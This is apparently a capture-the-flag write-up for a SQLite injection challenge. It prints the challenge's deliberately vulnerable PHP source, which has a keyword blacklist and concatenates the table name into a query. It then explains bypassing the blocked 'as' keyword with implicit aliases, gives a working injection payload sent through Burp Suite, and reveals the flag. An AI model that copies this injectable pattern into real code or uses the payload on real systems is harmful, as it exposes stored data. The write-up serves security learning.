Source is given
```
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

function sanitize($id, $table) {
    /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */
    if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }

    /* Rock-solid too! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id']) && isset ($_POST['table'])) {
    $id = $_POST['user_id'];
    $table = $_POST['table'];

    sanitize($id, $table);

    $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
    $query = 'SELECT id,username FROM ' . $table . ' WHERE id = ' . $id;
    //$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;

    $getUsers = $pdo->query($query);
    $users = $getUsers->fetchArray(SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    $userDetails['table'] = htmlentities($table);
    }
}
?>
```
+ Tried a lot of sqlite injection payloads but as there is a lot of blacklists, most of the payloads gives out error.
+ So, we need to find the flag from the database and there is a clue given here in the comments of the above source code.
+ $query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;
+ so, we know that alias in sqlite is written using `as`. but that keyword is also blacklisted. but in sqlite `as` keyword is not necessary to use an alias along with the column name it can also be written as follows:
"column_name as alias_name" == "column_name alias_name"
+ Although as is filtered out, in sqlite the new column name can just be put next to the original name, and it will be set as an alias, so the following would work.
+ SELECT id,username FROM (SELECT 2 id,enemy username FROM costume) WHERE id = 2
+ So intercepting the request in burp suite, the payload looks like this:
payload: user_id=2&table=(select 2 id, enemy username from costume)&submit=Submit+Query
Flag: WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
